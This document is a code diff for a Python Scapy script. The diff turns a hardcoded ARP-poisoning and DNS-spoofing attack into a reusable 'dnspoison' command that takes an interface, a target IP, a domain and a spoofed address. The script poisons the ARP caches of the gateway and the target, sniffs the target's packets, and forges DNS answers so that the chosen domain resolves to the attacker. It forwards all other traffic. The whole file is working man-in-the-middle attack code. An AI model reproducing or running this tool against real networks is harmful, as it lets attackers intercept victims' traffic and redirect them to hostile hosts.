@@ -1,42 +1,31 @@
 from scapy.all import *
-from arp_spoofing import *
+from arp_spoofing import * 
 
-spoofed_addr = "10.0.2.5"
 
-interface = "enp0s9"
-sock = conf.L2socket(iface=interface)
+dns_server_ip = ""
+dns_server_mac = ""
+spoofed_addr = ""
+iface = ""
+spoofed_dom={}
+sock = 0
+host_ip_addr = ""
+host_mac_addr = ""
 
-dns_server_ip = "142.251.39.110"
-dns_server_mac = "52:54:00:12:35:00"
 
-host_ip_addr = get_if_addr(interface)
-host_mac_addr = get_if_hwaddr(interface)
-
-dns_to_spoof={
-    b"google.com.":host_ip_addr  
-}
-
-def find_gateway_router():
-    global dns_server_ip
-    global dns_server_mac
-    global Target2
-    
+def get_gateway():
     gws=conf.route.route("0.0.0.0")[2]
-    #print(gws)
-    
+
+    global dns_server_ip
     dns_server_ip = gws
+    global dns_server_mac
     dns_server_mac = getmacbyip(gws)
 
     print("Gateway: " +  dns_server_ip + " " + dns_server_mac)
 
 
 def dns_spoof(pkt, ip_of_dns):
-    print("PKT-------------------------")
-    
     spoofed_pkt=pkt.copy()
     qname=pkt[DNSQR].qname
-    print("qname: " + qname)
-    print("ip_of_dns: " + ip_of_dns)
 
     spoofed_pkt[Ether].src = pkt[Ether].dst
     spoofed_pkt[Ether].dst = pkt[Ether].src
@@ -54,12 +43,11 @@ def dns_spoof(pkt, ip_of_dns):
     del spoofed_pkt[IP].chksum
     del spoofed_pkt[UDP].len
     del spoofed_pkt[UDP].chksum
-    
+
     sock.send(spoofed_pkt)
-    print("Sent")
 
 
-def forward(pkt):
+def fwd_pkt(pkt):
     pkt[Ether].dst=dns_server_mac
 
     if pkt.haslayer(IP):
@@ -73,49 +61,65 @@ def forward(pkt):
     sock.send(pkt)
 
 
-def dns_react(pkt):
-
-    if pkt.haslayer(DNS) and dns_to_spoof.has_key(pkt[DNSQR].qname):
+def dns_pkt_check(pkt):
+    if pkt.haslayer(DNS) and spoofed_dom.has_key(pkt[DNSQR].qname):
         dns_spoof(pkt, spoofed_addr)
     else:
-        forward(pkt)
+        fwd_pkt(pkt)
 
-        
-        
 
-def main_dns():
-    find_gateway_router()
+def arp_for_dns_spoof_loop(ip, mac, spoofed_ip):
+    print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
+    i = 0
+    while i in range(10):
+        arp_spoof(ip, mac, spoofed_ip)
+        time.sleep(1)
+        i+=1
+    print("ARP Poison to %s complete" % ip)
 
-    def arp_spoof_loop(ip, mac, spoofed_ip):
-            print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
-            i = 0
-            while i in range(10):
-                arp_spoof(ip, mac, spoofed_ip)
-                time.sleep(2)
-                i+=1
-            print("ARP end -------")
 
-    #gateway
-    ip_tgt = "10.0.2.1"
-    mac_sp_xp = "08:00:27:a8:31:23"
-    spoofed_ip_xp = "10.0.2.4"
-    arp_thread_xp = threading.Thread(target=arp_spoof_loop, args=(ip_tgt, mac_sp_xp, spoofed_ip_xp))
-    arp_thread_xp.daemon = True
-    arp_thread_xp.start()
+def start_dns_poison(cmd):
+    args = shlex.split(cmd)
+    tgtip = spoofed_addr = dom = None
+    for i, arg in enumerate(args):
+        if arg == "-iface" and i + 1 < len(args):
+            global iface
+            iface = args[i + 1]
+        elif arg == "-tgtip" and i + 1 < len(args):
+            tgtip = args[i + 1]
+        elif arg == "-dom" and i + 1 < len(args):
+            dom = args[i + 1]
+            global spoofed_dom
+            spoofed_dom[dom + "."] = host_ip_addr
+        elif arg == "-spaddr" and i + 1 < len(args):
+            global spoofed_addr
+            spoofed_addr = args[i + 1]
 
-    #victim
-    ip_2 = "10.0.2.4"
-    mac_2 = "08:00:27:a8:31:23"
-    spoofed_ip_2 = "10.0.2.1"
-    arp_thread_xp2 = threading.Thread(target=arp_spoof_loop, args=(ip_2, mac_2, spoofed_ip_2))
-    arp_thread_xp2.daemon = True
-    arp_thread_xp2.start()
+    if not iface or not tgtip or not dom or not spoofed_addr:
+        print("[!] Usage: dnspoison -iface <iface> -tgtip <target_ip> -dom <domain> -spaddr <spoofed_address>")
+        return
 
-    sniff(store = 0, filter="src host 10.0.2.4", iface = "enp0s9", prn = lambda x: dns_react(x))
+    global sock
+    sock = conf.L2socket(iface=iface)
+    global host_ip_addr
+    host_ip_addr = get_if_addr(iface)
+    global host_mac_addr
+    host_mac_addr = get_if_hwaddr(iface)
 
-main_dns()
+    get_gateway()
 
-#src host 10.0.2.4 udp and port 53
+    arp_thread_gws = threading.Thread(target=arp_for_dns_spoof_loop, args=(dns_server_ip, host_mac_addr, tgtip))
+    arp_thread_gws.daemon = True
+    arp_thread_gws.start()
+
+    arp_thread_tgt = threading.Thread(target=arp_for_dns_spoof_loop, args=(tgtip, host_mac_addr, dns_server_ip))
+    arp_thread_tgt.daemon = True
+    arp_thread_tgt.start()
+
+    sniff(store = 0, filter="src host " + str(tgtip), iface = iface, prn = lambda x: dns_pkt_check(x))
+
+
+#dnspoison -iface enp0s9 -tgtip 10.0.2.4 -dom google.com -spaddr 10.0.2.5 
 
 
 
